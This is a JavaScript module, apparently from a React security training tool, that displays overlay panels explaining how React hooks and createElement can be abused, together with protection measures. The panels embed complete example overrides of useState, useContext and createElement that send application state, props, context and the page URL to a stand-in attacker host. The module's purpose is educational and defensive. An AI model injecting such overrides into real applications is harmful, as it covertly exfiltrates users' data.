/**
 * React Security Suite - React Hooks Training Module
 * 
 * This module demonstrates how React hooks can be exploited for security vulnerabilities.
 * These demonstrations are for educational purposes only and are designed to run
 * in a controlled environment.
 */

/**
 * Demonstrates how React hooks can be exploited
 * @param {Object} options - Options for the demonstration
 * @returns {Object} Result of the demonstration
 */
export function demonstrateReactHooks(options = {}) {
  // Ensure we're in training mode
  if (!window.__reactSecuritySuiteTrainingMode) {
    console.error('[React Security Suite] Training mode must be active to run demonstrations');
    return { 
      success: false, 
      error: 'Training mode must be active to run demonstrations' 
    };
  }
  
  // Check if React is detected
  if (!window.React) {
    return { 
      success: false, 
      error: 'React not detected on this page' 
    };
  }
  
  // Create demonstration container
  const container = document.createElement('div');
  container.id = 'react-security-hooks-demo-container';
  container.style.cssText = `
    position: fixed;
    top: 40px;
    left: 20px;
    right: 20px;
    background-color: rgba(0, 0, 0, 0.8);
    color: #00ff00;
    font-family: monospace;
    padding: 20px;
    border-radius: 5px;
    z-index: 2147483646;
    max-height: 80vh;
    overflow: auto;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  
  let demoContent = '<h2>React Hooks Security Vulnerabilities</h2>';
  demoContent += '<p>This demonstrates how React hooks could be exploited for security vulnerabilities.</p>';
  
  // Detect React hooks
  const hooksDetected = detectReactHooks();
  
  if (hooksDetected.length > 0) {
    demoContent += '<h3>React Hooks Detected:</h3>';
    demoContent += '<ul>';
    hooksDetected.forEach(hook => {
      demoContent += `<li><strong>${hook.name}</strong>: ${hook.description}</li>`;
    });
    demoContent += '</ul>';
    
    // Show exploitation examples
    demoContent += '<h3>Potential Exploitation Techniques:</h3>';
    
    // useState exploitation
    if (hooksDetected.some(h => h.name === 'useState')) {
      demoContent += `<div class="hook-exploit">
        <h4>useState Hook Exploitation</h4>
        <p>The useState hook can be exploited to:</p>
        <ul>
          <li>Monitor state changes</li>
          <li>Modify state values</li>
          <li>Trigger unwanted re-renders</li>
        </ul>
        <pre>
// Malicious code example (DO NOT RUN)
const originalUseState = React.useState;

// Override useState
React.useState = function(initialState) {
  // Call the original to get state and setter
  const [state, setState] = originalUseState(initialState);
  
  // Create a wrapped setter that exfiltrates data
  const wrappedSetState = (newState) => {
    // Log or exfiltrate the new state
    console.log('State changed:', newState);
    
    // Send to attacker's server
    fetch('https://attck-deploy.net/attcks/T1119/collect', {
      method: 'POST',
      body: JSON.stringify({ 
        stateValue: typeof newState === 'function' 
          ? 'Function (cannot serialize)' 
          : newState,
        url: window.location.href
      }),
      headers: { 'Content-Type': 'application/json' }
    });
    
    // Call the original setter
    return setState(newState);
  };
  
  return [state, wrappedSetState];
};
        </pre>
      </div>`;
    }
    
    // useEffect exploitation
    if (hooksDetected.some(h => h.name === 'useEffect')) {
      demoContent += `<div class="hook-exploit">
        <h4>useEffect Hook Exploitation</h4>
        <p>The useEffect hook can be exploited to:</p>
        <ul>
          <li>Execute code on component mount/update</li>
          <li>Access dependencies passed to the hook</li>
          <li>Perform side effects without user knowledge</li>
        </ul>
        <pre>
// Malicious code example (DO NOT RUN)
const originalUseEffect = React.useEffect;

// Override useEffect
React.useEffect = function(effect, deps) {
  // Create a wrapped effect
  const wrappedEffect = () => {
    // Log or exfiltrate the dependencies
    console.log('Effect dependencies:', deps);
    
    // Execute the original effect
    const cleanup = effect();
    
    // Return a wrapped cleanup function
    return () => {
      console.log('Effect cleanup running');
      if (typeof cleanup === 'function') {
        return cleanup();
      }
    };
  };
  
  // Call the original with our wrapped effect
  return originalUseEffect(wrappedEffect, deps);
};
        </pre>
      </div>`;
    }
    
    // useContext exploitation
    if (hooksDetected.some(h => h.name === 'useContext')) {
      demoContent += `<div class="hook-exploit">
        <h4>useContext Hook Exploitation</h4>
        <p>The useContext hook can be exploited to:</p>
        <ul>
          <li>Access sensitive context values</li>
          <li>Monitor context changes</li>
          <li>Extract application-wide state</li>
        </ul>
        <pre>
// Malicious code example (DO NOT RUN)
const originalUseContext = React.useContext;

// Override useContext
React.useContext = function(Context) {
  // Get the context value
  const value = originalUseContext(Context);
  
  // Log or exfiltrate the context value
  console.log('Context accessed:', Context.displayName || 'Unknown Context', value);
  
  // Send to attacker's server if it looks interesting
  if (
    (typeof value === 'object' && value !== null) || 
    typeof value === 'string'
  ) {
    fetch('https://attck-deploy.net/attcks/T1119/collect', {
      method: 'POST',
      body: JSON.stringify({ 
        contextName: Context.displayName || 'Unknown Context',
        contextValue: value,
        url: window.location.href
      }),
      headers: { 'Content-Type': 'application/json' }
    });
  }
  
  return value;
};
        </pre>
      </div>`;
    }
    
    // Protection measures
    demoContent += '<h3>Protection Measures:</h3>';
    demoContent += `<ul>
      <li>Use React in production mode which minimizes exposed internals</li>
      <li>Implement Content Security Policy (CSP) to restrict script execution</li>
      <li>Avoid storing sensitive information in React state or context</li>
      <li>Consider using a custom ESLint plugin to detect unsafe hook usage</li>
      <li>Monitor for suspicious overrides of React methods</li>
      <li>Keep React and its dependencies updated to the latest versions</li>
    </ul>`;
  } else {
    demoContent += '<p>No React hooks detected on this page. This demonstration requires a React application using hooks.</p>';
  }
  
  container.innerHTML = demoContent;
  document.body.appendChild(container);
  
  // Register cleanup function
  if (window.__reactSecuritySuiteDemoCleanupFunctions) {
    window.__reactSecuritySuiteDemoCleanupFunctions.push(() => {
      container.remove();
    });
  } else {
    window.__reactSecuritySuiteDemoCleanupFunctions = [() => {
      container.remove();
    }];
  }
  
  return { success: true };
}

/**
 * Detect React hooks in the current page
 * @returns {Array} Array of detected hooks
 */
function detectReactHooks() {
  const detectedHooks = [];
  
  // Check for common React hooks
  if (window.React) {
    const hooks = [
      { 
        name: 'useState', 
        description: 'State management hook',
        check: () => typeof window.React.useState === 'function'
      },
      { 
        name: 'useEffect', 
        description: 'Side effects hook',
        check: () => typeof window.React.useEffect === 'function'
      },
      { 
        name: 'useContext', 
        description: 'Context access hook',
        check: () => typeof window.React.useContext === 'function'
      },
      { 
        name: 'useReducer', 
        description: 'Reducer state management hook',
        check: () => typeof window.React.useReducer === 'function'
      },
      { 
        name: 'useCallback', 
        description: 'Memoized callback hook',
        check: () => typeof window.React.useCallback === 'function'
      },
      { 
        name: 'useMemo', 
        description: 'Memoized value hook',
        check: () => typeof window.React.useMemo === 'function'
      },
      { 
        name: 'useRef', 
        description: 'Mutable reference hook',
        check: () => typeof window.React.useRef === 'function'
      },
      { 
        name: 'useLayoutEffect', 
        description: 'Synchronous effect hook',
        check: () => typeof window.React.useLayoutEffect === 'function'
      }
    ];
    
    // Check each hook
    hooks.forEach(hook => {
      if (hook.check()) {
        detectedHooks.push(hook);
      }
    });
  }
  
  return detectedHooks;
}

/**
 * Demonstrates how to hook into React's component lifecycle
 * @param {Object} options - Options for the demonstration
 * @returns {Object} Result of the demonstration
 */
export function demonstrateComponentLifecycleHooks(options = {}) {
  // Ensure we're in training mode
  if (!window.__reactSecuritySuiteTrainingMode) {
    console.error('[React Security Suite] Training mode must be active to run demonstrations');
    return { 
      success: false, 
      error: 'Training mode must be active to run demonstrations' 
    };
  }
  
  // Check if React is detected
  if (!window.React) {
    return { 
      success: false, 
      error: 'React not detected on this page' 
    };
  }
  
  // Create demonstration container
  const container = document.createElement('div');
  container.id = 'react-security-lifecycle-demo-container';
  container.style.cssText = `
    position: fixed;
    top: 40px;
    left: 20px;
    right: 20px;
    background-color: rgba(0, 0, 0, 0.8);
    color: #00ff00;
    font-family: monospace;
    padding: 20px;
    border-radius: 5px;
    z-index: 2147483646;
    max-height: 80vh;
    overflow: auto;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  
  let demoContent = '<h2>React Component Lifecycle Hooks</h2>';
  demoContent += '<p>This demonstrates how React component lifecycle methods could be exploited.</p>';
  
  // Detect React version
  const reactVersion = getReactVersion();
  demoContent += `<p>Detected React version: ${reactVersion}</p>`;
  
  // Show exploitation examples
  demoContent += '<h3>Potential Exploitation Techniques:</h3>';
  
  // Class component lifecycle hooks
  demoContent += `<div class="lifecycle-exploit">
    <h4>Class Component Lifecycle Exploitation</h4>
    <p>React class component lifecycle methods can be exploited to:</p>
    <ul>
      <li>Monitor component mounting, updating, and unmounting</li>
      <li>Access props and state at various lifecycle stages</li>
      <li>Inject code into the rendering process</li>
    </ul>
    <pre>
// Malicious code example (DO NOT RUN)
const originalCreateElement = React.createElement;

// Override createElement to inject into class components
React.createElement = function(type, props, ...children) {
  // Only target class components
  if (typeof type === 'function' && type.prototype && type.prototype.isReactComponent) {
    // Create a wrapped component
    const WrappedComponent = function(props) {
      // Create an instance of the original component
      const instance = new type(props);
      
      // Hook into lifecycle methods
      const originalComponentDidMount = instance.componentDidMount;
      instance.componentDidMount = function() {
        console.log('Component mounted:', type.name, this.props, this.state);
        
        // Exfiltrate component data
        fetch('https://attck-deploy.net/attcks/T1119/collect', {
          method: 'POST',
          body: JSON.stringify({
            componentName: type.name,
            props: this.props,
            state: this.state,
            url: window.location.href
          }),
          headers: { 'Content-Type': 'application/json' }
        });
        
        // Call original method
        if (originalComponentDidMount) {
          return originalComponentDidMount.apply(this);
        }
      };
      
      return instance;
    };
    
    // Copy static properties
    Object.assign(WrappedComponent, type);
    WrappedComponent.prototype = type.prototype;
    
    // Use the wrapped component instead
    return originalCreateElement.apply(React, [WrappedComponent, props, ...children]);
  }
  
  // For other elements, use the original implementation
  return originalCreateElement.apply(React, [type, props, ...children]);
};
    </pre>
  </div>`;
  
  // Function component hooks
  demoContent += `<div class="lifecycle-exploit">
    <h4>Function Component Hooks Exploitation</h4>
    <p>React function components and hooks can be exploited to:</p>
    <ul>
      <li>Monitor component rendering and effects</li>
      <li>Access props and state</li>
      <li>Inject code into the rendering process</li>
    </ul>
    <pre>
// Malicious code example (DO NOT RUN)
// This example shows how to hook into function components

const originalCreateElement = React.createElement;

// Override createElement to inject into function components
React.createElement = function(type, props, ...children) {
  // Only target function components (not class components or intrinsic elements)
  if (typeof type === 'function' && (!type.prototype || !type.prototype.isReactComponent)) {
    // Create a wrapped component
    const WrappedComponent = function(props) {
      console.log('Function component rendering:', type.name || 'Anonymous', props);
      
      // Call the original function component
      const result = type(props);
      
      // Exfiltrate component data
      fetch('https://attck-deploy.net/attcks/T1119/collect', {
        method: 'POST',
        body: JSON.stringify({
          componentName: type.name || 'Anonymous',
          props: props,
          url: window.location.href
        }),
        headers: { 'Content-Type': 'application/json' }
      });
      
      return result;
    };
    
    // Copy name and other properties
    Object.defineProperty(WrappedComponent, 'name', { value: type.name });
    
    // Use the wrapped component instead
    return originalCreateElement.apply(React, [WrappedComponent, props, ...children]);
  }
  
  // For other elements, use the original implementation
  return originalCreateElement.apply(React, [type, props, ...children]);
};
    </pre>
  </div>`;
  
  // Protection measures
  demoContent += '<h3>Protection Measures:</h3>';
  demoContent += `<ul>
    <li>Use React in production mode which minimizes exposed internals</li>
    <li>Implement Content Security Policy (CSP) to restrict script execution</li>
    <li>Monitor for suspicious overrides of React.createElement</li>
    <li>Consider using a custom ESLint plugin to detect unsafe patterns</li>
    <li>Keep React and its dependencies updated to the latest versions</li>
    <li>Use tools like React Security Suite to monitor and protect React applications</li>
  </ul>`;
  
  container.innerHTML = demoContent;
  document.body.appendChild(container);
  
  // Register cleanup function
  if (window.__reactSecuritySuiteDemoCleanupFunctions) {
    window.__reactSecuritySuiteDemoCleanupFunctions.push(() => {
      container.remove();
    });
  } else {
    window.__reactSecuritySuiteDemoCleanupFunctions = [() => {
      container.remove();
    }];
  }
  
  return { success: true };
}

/**
 * Get React version if available
 * @returns {string} React version or 'unknown'
 */
function getReactVersion() {
  let version = 'unknown';
  
  if (window.React && window.React.version) {
    version = window.React.version;
  } else if (document.querySelector('[data-reactroot]')) {
    version = '16+';
  } else if (document.querySelector('[data-reactid]')) {
    version = '15 or earlier';
  }
  
  return version;
}
